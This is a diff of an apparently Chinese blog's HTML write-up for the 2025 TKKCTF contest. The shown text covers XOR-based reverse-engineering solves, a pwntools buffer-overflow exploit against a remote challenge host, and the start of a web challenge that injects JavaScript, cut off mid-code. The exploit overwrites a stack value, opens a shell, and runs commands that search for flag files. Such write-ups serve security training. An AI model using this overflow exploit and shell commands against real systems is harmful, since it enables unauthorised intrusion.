@@ -19,15 +19,80 @@
   <meta name="author" content="Meiyouqian">
   <meta name="keywords" content="">
   
-    <meta name="description" content="ReverseSeal![](2025 TKKCTF&#x2F;1765004782013-b950ca11-5634-47d7-89f7-8f680ba3ce74.png) 题目如上，没有什么线索，我们直接下载附件查看 先die和file看看，没什么特别的，是一个arm64的Mach-O可执行文件 ![](2025 TKKCTF&#x2F;1765004924955-ca80f470-3817-">
+    <meta name="description" content="ReverseSeal 题目如上，没有什么线索，我们直接下载附件查看 先die和file看看，没什么特别的，是一个arm64的Mach-O可执行文件   再看一下字符串，strings一下  能看到不少的字符串，大概能看得出来在说需要一个key，而且还会检查长度 看上去逻辑不是很复杂，我们扔给IDA看看 这边IDA我v8.3的反编译不了，像下边一样报错了  但是v9.1的很坚挺，直接就给反编译出来">
 <meta property="og:type" content="article">
 <meta property="og:title" content="2025TKKCTF">
-<meta property="og:url" content="https://mei-you-qian.github.io/2025/12/09/2025%20TKKCTF/index.html">
+<meta property="og:url" content="https://mei-you-qian.github.io/2025/12/09/2025_TKKCTF/index.html">
 <meta property="og:site_name" content="玫幽倩的小博客">
-<meta property="og:description" content="ReverseSeal![](2025 TKKCTF&#x2F;1765004782013-b950ca11-5634-47d7-89f7-8f680ba3ce74.png) 题目如上，没有什么线索，我们直接下载附件查看 先die和file看看，没什么特别的，是一个arm64的Mach-O可执行文件 ![](2025 TKKCTF&#x2F;1765004924955-ca80f470-3817-">
+<meta property="og:description" content="ReverseSeal 题目如上，没有什么线索，我们直接下载附件查看 先die和file看看，没什么特别的，是一个arm64的Mach-O可执行文件   再看一下字符串，strings一下  能看到不少的字符串，大概能看得出来在说需要一个key，而且还会检查长度 看上去逻辑不是很复杂，我们扔给IDA看看 这边IDA我v8.3的反编译不了，像下边一样报错了  但是v9.1的很坚挺，直接就给反编译出来">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765004782013-b950ca11-5634-47d7-89f7-8f680ba3ce74.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765004924955-ca80f470-3817-4a76-8336-450e78e786b5.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765005071507-6ca0b8a6-5c37-4386-872f-4728136258b8.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765005224026-f4d57845-72ef-4114-ad27-a9c56f4d28df.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765005448453-c1a772dd-4be5-4043-832c-3e07277ac39e.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765005583070-499c5005-2dae-4766-9e13-4c29652ad33d.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765005746419-da414ffa-2032-413c-adcf-522a1c094eb7.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765005799437-9193515f-4a8b-47a8-a3eb-5cbffcf5117f.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765006020800-732b1fb4-b7aa-4d3d-9265-967cde0a5360.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765007086804-92602fcf-214b-4c1b-b007-5016d8dff8a4.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765007630373-c36615c0-4f1a-4a1a-8e95-f1f657fd3f78.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765007652772-aa58813b-698d-4693-96e0-78939eddb8fb.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765007841895-43a5051c-f4b0-477e-9bfe-ffc9df028a58.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765008137675-50e84ed5-1719-4b6f-9224-0baa0ad420a7.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765008424500-ae677625-55ca-490a-be6a-839b8bd63d87.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765008438559-bb106cf6-a820-4f16-a93d-b7fd29ab58c1.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765008494968-94b5037a-e29c-415e-a9d3-4d3651b67ef5.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765008934798-7d7866e2-a5ee-44f3-8008-d90a4b77e11f.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765009057693-9fe2e186-5cb9-4497-9fa3-753797d37abd.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765009166718-aea6336d-b068-4a31-81f1-e0005970e645.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765009228451-f32e1124-2576-452d-be87-ee38da31d607.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765009273225-bb523165-b74e-41f7-8f92-7d87bef8b19b.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765091858666-893f33fc-631a-4ff4-8a65-606fce2ce1b0.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765025739142-5e406733-3f26-4dd7-8a87-b5ff56db2ffa.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765091989524-d0578848-88f6-496f-99dd-f0a0d3511f91.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765092041380-39604dd7-2083-4f56-9910-66e7ad6315b0.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765092152769-b068376f-443f-402c-8ebd-aadd25740052.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765094088188-a5849cf6-c88f-4fe6-bc9b-bbe1b87ee5ba.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765094131496-1cae7a0b-3faf-498f-a18f-ba124d5fe360.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765019972824-4673c0b0-e6b8-4147-aea1-49621e99e846.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765020378321-fab07253-84ea-4bb1-aa54-cbebb5e7a426.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765020467202-745b9c15-65c6-4568-acdf-3c004c86d7de.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765021056226-9be28820-fd46-40b0-b31c-287486307910.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765021160532-14f9130e-cffb-4c22-a540-05f1ea68148a.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765016892791-cfd6b480-26f8-46a4-abbd-f0e4fb75dfd3.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765017962510-5a917f16-581a-4352-8069-a92d6753f42e.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765018255935-9af88963-24ac-4c43-a6ed-dcc3ff649882.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765018374507-3d7f4322-03d8-4f18-b396-f5978e559aff.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765018634689-287db60e-d37d-4020-b3f5-b9114fe1bb42.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765018682385-e3e91638-6df0-46b8-beb1-b5c34c6a6b29.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765018697197-ac18f78b-d5e5-49ab-8c92-edefcef3f9cf.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765018720612-a98e0b83-bdcd-4653-ad7a-cdfb343915b8.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765186128080-b44636e2-c366-461e-8a33-d081e330866a.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765186670231-5ffa52f7-5025-4357-9204-ecf73e6b3e1a.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765186868421-dc1f9d47-4fe1-48bf-a767-1b0ee121854a.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765187308615-68c21b94-9b3d-4152-81cf-2d90d45df755.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765196598143-daf7c7fc-5e4e-400a-afa2-55fdd88b26b3.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765193394660-2b3f4cae-4ad8-4620-bfed-9a2fca4f9eba.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765195363846-593a563d-0e37-44f8-95d2-6cce0e7c9a65.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765196662449-bab64788-40bf-4f13-a4f3-14f70bff9698.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765196770521-ee3c8373-8601-4d41-bcbc-039a4324e383.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765197113641-4d7a1175-cc1c-4353-918f-778b7152b554.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765197133664-ac8d5cf7-dec1-4582-82e8-5415fdd1ced1.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765197178219-1d129788-663a-452e-bf7b-4bedc25dbf6e.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765197153675-9b93f0e3-9109-490c-9f82-714745ac858b.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765199646069-392ace19-976b-4aeb-ac93-50b90001aff0.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765199849042-c22c8b4e-3e4f-4a99-a737-56b4b7f71158.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765197269826-300d7258-9d61-47d1-ab39-74687f042ce1.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765200612355-3b9de193-214a-4fd7-af58-be7a03694daf.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765201093094-a34f2fb6-d327-4a1e-b8ba-ad371145c8ef.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765201277194-33701c15-901d-4407-9c12-3b714ff0ae63.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765201547857-b23c4992-1a42-4dcc-a542-7559875af2ab.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765201588815-55e73f5a-68dd-487d-84f9-94602c79be3f.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765201609324-bff03271-2de1-4a94-b2d7-0e10d1f6df73.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765201637293-a51dddf6-0253-4594-826f-d743af675a2f.png">
 <meta property="article:published_time" content="2025-12-08T16:00:00.000Z">
-<meta property="article:modified_time" content="2025-12-09T01:07:35.242Z">
+<meta property="article:modified_time" content="2026-01-20T09:19:02.624Z">
 <meta property="article:author" content="Meiyouqian">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="Misc">
@@ -35,6 +100,7 @@
 <meta property="article:tag" content="Reverse">
 <meta property="article:tag" content="Web">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://mei-you-qian.github.io/2025_TKKCTF/1765004782013-b950ca11-5634-47d7-89f7-8f680ba3ce74.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
@@ -249,7 +315,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          5.4k 字
+          4.8k 字
         
       </span>
     
@@ -260,7 +326,7 @@
         
         
         
-          46 分钟
+          40 分钟
         
       </span>
     
@@ -302,42 +368,42 @@
             
               <div class="markdown-body">
                 
-                <h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Seal"><a href="#Seal" class="headerlink" title="Seal"></a>Seal</h2><p>![](2025 TKKCTF&#x2F;1765004782013-b950ca11-5634-47d7-89f7-8f680ba3ce74.png)</p>
+                <h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Seal"><a href="#Seal" class="headerlink" title="Seal"></a>Seal</h2><p><img src="/2025_TKKCTF/1765004782013-b950ca11-5634-47d7-89f7-8f680ba3ce74.png" srcset="/img/loading.gif" lazyload></p>
 <p>题目如上，没有什么线索，我们直接下载附件查看</p>
 <p>先die和file看看，没什么特别的，是一个arm64的Mach-O可执行文件</p>
-<p>![](2025 TKKCTF&#x2F;1765004924955-ca80f470-3817-4a76-8336-450e78e786b5.png)</p>
-<p>![](2025 TKKCTF&#x2F;1765005071507-6ca0b8a6-5c37-4386-872f-4728136258b8.png)</p>
+<p><img src="/2025_TKKCTF/1765004924955-ca80f470-3817-4a76-8336-450e78e786b5.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2025_TKKCTF/1765005071507-6ca0b8a6-5c37-4386-872f-4728136258b8.png" srcset="/img/loading.gif" lazyload></p>
 <p>再看一下字符串，strings一下</p>
-<p>![](2025 TKKCTF&#x2F;1765005224026-f4d57845-72ef-4114-ad27-a9c56f4d28df.png)</p>
+<p><img src="/2025_TKKCTF/1765005224026-f4d57845-72ef-4114-ad27-a9c56f4d28df.png" srcset="/img/loading.gif" lazyload></p>
 <p>能看到不少的字符串，大概能看得出来在说需要一个key，而且还会检查长度</p>
 <p>看上去逻辑不是很复杂，我们扔给IDA看看</p>
 <p>这边IDA我v8.3的反编译不了，像下边一样报错了</p>
-<p>![](2025 TKKCTF&#x2F;1765005448453-c1a772dd-4be5-4043-832c-3e07277ac39e.png)</p>
+<p><img src="/2025_TKKCTF/1765005448453-c1a772dd-4be5-4043-832c-3e07277ac39e.png" srcset="/img/loading.gif" lazyload></p>
 <p>但是v9.1的很坚挺，直接就给反编译出来了</p>
-<p>![](2025 TKKCTF&#x2F;1765005583070-499c5005-2dae-4766-9e13-4c29652ad33d.png)</p>
+<p><img src="/2025_TKKCTF/1765005583070-499c5005-2dae-4766-9e13-4c29652ad33d.png" srcset="/img/loading.gif" lazyload></p>
 <p>那就很明确了，上来在检测长度是否为33</p>
-<p>![](2025 TKKCTF&#x2F;1765005746419-da414ffa-2032-413c-adcf-522a1c094eb7.png)</p>
+<p><img src="/2025_TKKCTF/1765005746419-da414ffa-2032-413c-adcf-522a1c094eb7.png" srcset="/img/loading.gif" lazyload></p>
 <p>核心加密区域明显在这一块，a2是key，然后byte_100008000里边存着的都是密文</p>
 <p>就一步简单异或</p>
-<p>![](2025 TKKCTF&#x2F;1765005799437-9193515f-4a8b-47a8-a3eb-5cbffcf5117f.png)</p>
+<p><img src="/2025_TKKCTF/1765005799437-9193515f-4a8b-47a8-a3eb-5cbffcf5117f.png" srcset="/img/loading.gif" lazyload></p>
 <p>双击进去就全看见了密文</p>
 <p>至于key，因为flag形式是xujc{}的，所以前四位与一个东西异或会变成xujc就行</p>
 <p>很容易发现是0xD3</p>
 <p>所以key和密文都有了，直接解就好了</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">enc = [ 0xAB,0xA6,0xB9,0xB0,0xA8,0xBE,0xB2,0xB0,0xE3,0xE6,0x8C,0xE7,0xA1,0xBE,0xE5,0xE7,0x8C,0xE2,0xBD,0xA7,0xE0,0xB4,0xA1,0xE2,0xA7,0xAA,0x8C,0xB0,0xBB,0xE0,0xB0,0xB8,0xAE]<br><br>for i in range(len(enc)):<br>    enc[i] ^= 0xD3<br><br>print(bytes(enc))<br></code></pre></td></tr></table></figure>
 
-<p>![](2025 TKKCTF&#x2F;1765006020800-732b1fb4-b7aa-4d3d-9265-967cde0a5360.png)</p>
+<p><img src="/2025_TKKCTF/1765006020800-732b1fb4-b7aa-4d3d-9265-967cde0a5360.png" srcset="/img/loading.gif" lazyload></p>
 <p>得到flag为xujc{mac05_4rm64_1nt3gr1ty_ch3ck}</p>
-<h2 id="Matzs-Nightmare"><a href="#Matzs-Nightmare" class="headerlink" title="Matzs Nightmare"></a>Matzs Nightmare</h2><p>![](2025 TKKCTF&#x2F;1765007086804-92602fcf-214b-4c1b-b007-5016d8dff8a4.png)</p>
+<h2 id="Matzs-Nightmare"><a href="#Matzs-Nightmare" class="headerlink" title="Matzs Nightmare"></a>Matzs Nightmare</h2><p><img src="/2025_TKKCTF/1765007086804-92602fcf-214b-4c1b-b007-5016d8dff8a4.png" srcset="/img/loading.gif" lazyload></p>
 <p>依旧die，file</p>
-<p>![](2025 TKKCTF&#x2F;1765007630373-c36615c0-4f1a-4a1a-8e95-f1f657fd3f78.png)</p>
-<p>![](2025 TKKCTF&#x2F;1765007652772-aa58813b-698d-4693-96e0-78939eddb8fb.png)</p>
+<p><img src="/2025_TKKCTF/1765007630373-c36615c0-4f1a-4a1a-8e95-f1f657fd3f78.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2025_TKKCTF/1765007652772-aa58813b-698d-4693-96e0-78939eddb8fb.png" srcset="/img/loading.gif" lazyload></p>
 <p>依旧是个arm64的Mach-O可执行文件</p>
 <p>依旧放到v9.1的ida里，v8.3的反编译不了</p>
-<p>![](2025 TKKCTF&#x2F;1765007841895-43a5051c-f4b0-477e-9bfe-ffc9df028a58.png)</p>
+<p><img src="/2025_TKKCTF/1765007841895-43a5051c-f4b0-477e-9bfe-ffc9df028a58.png" srcset="/img/loading.gif" lazyload></p>
 <p>看看字符串，发现有一堆的mruby，这是Ruby语言的轻量级解释器</p>
 <p>和题目中的语言，以及题目Matzs都对应上了，因为mruby的开发者就是Matzs团队</p>
-<p>![](2025 TKKCTF&#x2F;1765008137675-50e84ed5-1719-4b6f-9224-0baa0ad420a7.png)</p>
+<p><img src="/2025_TKKCTF/1765008137675-50e84ed5-1719-4b6f-9224-0baa0ad420a7.png" srcset="/img/loading.gif" lazyload></p>
 <p>最核心的是RITE0300完美对应 mruby 的字节码格式标志，本题就是一个宿主C程序加上了内嵌的mruby的结构</p>
 <p>C语言的那部分主要负责启动mruby，把RITE字节码load进去，然后去进行校验</p>
 <p>所以我们的核心就是把这个字节码抽出来，然后看清楚检验flag的逻辑，最后求flag</p>
@@ -349,25 +415,25 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">grep -oba &quot;RITE0300&quot; matzs<br></code></pre></td></tr></table></figure>
 
 <p>我们通过标志位RITE0300来锁定并gerp获得偏移量</p>
-<p>![](2025 TKKCTF&#x2F;1765008424500-ae677625-55ca-490a-be6a-839b8bd63d87.png)</p>
+<p><img src="/2025_TKKCTF/1765008424500-ae677625-55ca-490a-be6a-839b8bd63d87.png" srcset="/img/loading.gif" lazyload></p>
 <p>是在450208的位置</p>
-<p>![](2025 TKKCTF&#x2F;1765008438559-bb106cf6-a820-4f16-a93d-b7fd29ab58c1.png)</p>
+<p><img src="/2025_TKKCTF/1765008438559-bb106cf6-a820-4f16-a93d-b7fd29ab58c1.png" srcset="/img/loading.gif" lazyload></p>
 <p>就这里</p>
 <p>然后是确定SIZE，注意第0x08–0x0B这4个字节即可</p>
-<p>![](2025 TKKCTF&#x2F;1765008494968-94b5037a-e29c-415e-a9d3-4d3651b67ef5.png)</p>
+<p><img src="/2025_TKKCTF/1765008494968-94b5037a-e29c-415e-a9d3-4d3651b67ef5.png" srcset="/img/loading.gif" lazyload></p>
 <p>0x045E，所以是1118</p>
-<p>![](2025 TKKCTF&#x2F;1765008934798-7d7866e2-a5ee-44f3-8008-d90a4b77e11f.png)</p>
+<p><img src="/2025_TKKCTF/1765008934798-7d7866e2-a5ee-44f3-8008-d90a4b77e11f.png" srcset="/img/loading.gif" lazyload></p>
 <p>执行dd命令，得到code.mrb</p>
 <p>有了这个字节码之后看看信息和指令就好了</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">mruby -v -d code.mrb<br></code></pre></td></tr></table></figure>
 
-<p> ![](2025 TKKCTF&#x2F;1765009057693-9fe2e186-5cb9-4497-9fa3-753797d37abd.png)</p>
+<p> <img src="/2025_TKKCTF/1765009057693-9fe2e186-5cb9-4497-9fa3-753797d37abd.png" srcset="/img/loading.gif" lazyload></p>
 <p>好接下来我们看看在干啥就好了</p>
-<p>![](2025 TKKCTF&#x2F;1765009166718-aea6336d-b068-4a31-81f1-e0005970e645.png)</p>
+<p><img src="/2025_TKKCTF/1765009166718-aea6336d-b068-4a31-81f1-e0005970e645.png" srcset="/img/loading.gif" lazyload></p>
 <p>首先是这一块，对长度在检测，限制长度需要是45才可以</p>
-<p>![](2025 TKKCTF&#x2F;1765009228451-f32e1124-2576-452d-be87-ee38da31d607.png)</p>
+<p><img src="/2025_TKKCTF/1765009228451-f32e1124-2576-452d-be87-ee38da31d607.png" srcset="/img/loading.gif" lazyload></p>
 <p>然后是这边开始按 9 个字符一组切块</p>
-<p>![](2025 TKKCTF&#x2F;1765009273225-bb523165-b74e-41f7-8f92-7d87bef8b19b.png)</p>
+<p><img src="/2025_TKKCTF/1765009273225-bb523165-b74e-41f7-8f92-7d87bef8b19b.png" srcset="/img/loading.gif" lazyload></p>
 <p>后边是两块，刚刚45个被切成了5组嘛，就一组一组来</p>
 <p>这边是第一组，可以看到上边是常量数组，下边是XOR密钥是55</p>
 <p>五组都这样子来大概就是这样子</p>
@@ -377,19 +443,19 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plain">enc = [<br>    [79, 66, 93, 84, 76, 19, 95, 4, 104],<br>    [221, 154, 223, 155, 206, 245, 196, 153, 220],<br>    [33, 96, 77, 54, 38, 107, 77, 101, 122],<br>    [238, 175, 238, 130, 249, 181, 238, 130, 190],<br>    [97, 56, 102, 10, 51, 39, 101, 56, 40],<br>]<br><br>keys = [55, 170, 18, 221, 85]<br><br>flag = &quot;&quot;<br>for arr, key in zip(enc, keys):<br>    flag += &quot;&quot;.join(chr(c ^ key) for c in arr)<br><br>print(flag)<br></code></pre></td></tr></table></figure>
 
 <p> 输出得到答案：xujc{$h3_w0u1d_n3v3r_$4y_wh3r3_$h3_c4m3_fr0m}</p>
-<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="Magic-Over"><a href="#Magic-Over" class="headerlink" title="Magic Over"></a>Magic Over</h2><p>![](2025 TKKCTF&#x2F;1765091858666-893f33fc-631a-4ff4-8a65-606fce2ce1b0.png)</p>
+<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="Magic-Over"><a href="#Magic-Over" class="headerlink" title="Magic Over"></a>Magic Over</h2><p><img src="/2025_TKKCTF/1765091858666-893f33fc-631a-4ff4-8a65-606fce2ce1b0.png" srcset="/img/loading.gif" lazyload></p>
 <p>保护：</p>
-<p>![](2025 TKKCTF&#x2F;1765025739142-5e406733-3f26-4dd7-8a87-b5ff56db2ffa.png)</p>
-<p>![](2025 TKKCTF&#x2F;1765091989524-d0578848-88f6-496f-99dd-f0a0d3511f91.png)</p>
+<p><img src="/2025_TKKCTF/1765025739142-5e406733-3f26-4dd7-8a87-b5ff56db2ffa.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2025_TKKCTF/1765091989524-d0578848-88f6-496f-99dd-f0a0d3511f91.png" srcset="/img/loading.gif" lazyload></p>
 <p>看主函数，这边存在溢出，正好有8个字节</p>
-<p>![](2025 TKKCTF&#x2F;1765092041380-39604dd7-2083-4f56-9910-66e7ad6315b0.png)</p>
+<p><img src="/2025_TKKCTF/1765092041380-39604dd7-2083-4f56-9910-66e7ad6315b0.png" srcset="/img/loading.gif" lazyload></p>
 <p>让v5初始值为0x04030201，然后填充进去0xBEBABEC0即可（小端序）</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br>context.log_level = &#x27;debug&#x27;<br><br>p = remote(&#x27;47.122.52.77&#x27;, 33405)<br>p.recvuntil(b&quot;[&gt;] Enter data to overwrite buffer: \n&quot;)<br><br>payload = b&#x27;A&#x27; * 56<br>payload += p64(0xC0FEBABE)<br><br>p.sendline(payload)<br>p.recvuntil(b&quot;Opening root shell...\n&quot;)<br><br>p.sendline(b&quot;cat flag* 2&gt;/dev/null || cat /flag* 2&gt;/dev/null || find / -name flag* 2&gt;/dev/null || env | grep -i flag&quot;)<br><br>flag = p.recvall(timeout=2).decode()<br>print(f&quot;\n[+] Found flag: &#123;flag&#125;&quot;)<br><br>p.close()<br></code></pre></td></tr></table></figure>
 
 <p>得到flag</p>
-<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Real-or-AI"><a href="#Real-or-AI" class="headerlink" title="Real or AI"></a>Real or AI</h2><p>![](2025 TKKCTF&#x2F;1765092152769-b068376f-443f-402c-8ebd-aadd25740052.png)</p>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Real-or-AI"><a href="#Real-or-AI" class="headerlink" title="Real or AI"></a>Real or AI</h2><p><img src="/2025_TKKCTF/1765092152769-b068376f-443f-402c-8ebd-aadd25740052.png" srcset="/img/loading.gif" lazyload></p>
 <p>一个游戏，我们在源代码能看到得到flag的方法</p>
-<p>![](2025 TKKCTF&#x2F;1765094088188-a5849cf6-c88f-4fe6-bc9b-bbe1b87ee5ba.png)</p>
+<p><img src="/2025_TKKCTF/1765094088188-a5849cf6-c88f-4fe6-bc9b-bbe1b87ee5ba.png" srcset="/img/loading.gif" lazyload></p>
 <p>根据要求，先需要修改，注入 SHA-256 函数并重写原函数</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs plain">// 先注入 SHA-256 实现<br>function sha256(ascii) &#123;<br>    function rightRotate(value, amount) &#123;<br>        return (value &gt;&gt;&gt; amount) | (value &lt;&lt; (32 - amount));<br>    &#125;<br>    var mathPow = Math.pow;<br>    var maxWord = mathPow(2, 32);<br>    var lengthProperty = &#x27;length&#x27;;<br>    var i, j;<br>    var result = &#x27;&#x27;;<br>    var words = [];<br>    var asciiBitLength = ascii[lengthProperty] * 8;<br>    var hash = sha256.h = sha256.h || [];<br>    var k = sha256.k = sha256.k || [];<br>    var primeCounter = k[lengthProperty];<br>    var isComposite = &#123;&#125;;<br>    for (var candidate = 2; primeCounter &lt; 